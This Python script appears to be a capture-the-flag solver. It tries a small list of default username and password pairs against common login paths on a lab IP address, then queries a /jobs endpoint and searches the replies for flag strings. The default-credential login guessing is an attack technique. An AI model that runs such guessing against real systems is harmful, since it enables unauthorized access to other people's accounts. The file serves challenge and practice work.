import requests
import json

TARGET_URL = "http://10.0.162.112:80"

def main():
    session = requests.Session()
    
    # Try common login endpoints and credentials
    login_paths = ["/login", "/api/login", "/auth", "/signin"]
    credentials = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "user", "password": "user"},
        {"username": "guest", "password": "guest"},
    ]
    
    logged_in = False
    
    # Attempt login
    for path in login_paths:
        for cred in credentials:
            try:
                resp = session.post(f"{TARGET_URL}{path}", json=cred, timeout=5)
                if resp.status_code == 200:
                    print(f"[+] Login success at {path} with {cred}")
                    logged_in = True
                    break
                elif resp.status_code != 404:
                    print(f"[*] {path} - Status: {resp.status_code} - {resp.text[:100]}")
            except Exception as e:
                pass
        if logged_in:
            break
    
    # POST /jobs
    try:
        resp = session.post(f"{TARGET_URL}/jobs", timeout=5)
        print(f"\n[*] POST /jobs - Status: {resp.status_code}")
        print(f"[*] Headers: {dict(resp.headers)}")
        try:
            json_data = resp.json()
            print(f"[*] JSON Response:\n{json.dumps(json_data, indent=2, ensure_ascii=False)}")
            
            # Deep search for flags
            json_str = json.dumps(json_data)
            import re
            flags = re.findall(r'(flag\{[^}]+\}|CTF\{[^}]+\}|picoCTF\{[^}]+\})', json_str, re.IGNORECASE)
            if flags:
                print(f"\n[+] FLAGS FOUND: {flags}")
        except:
            print(f"[*] Raw Response:\n{resp.text}")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Also try GET /jobs
    try:
        resp = session.get(f"{TARGET_URL}/jobs", timeout=5)
        print(f"\n[*] GET /jobs - Status: {resp.status_code}")
        try:
            json_data = resp.json()
            print(f"[*] JSON Response:\n{json.dumps(json_data, indent=2, ensure_ascii=False)}")
        except:
            print(f"[*] Raw Response:\n{resp.text[:500]}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()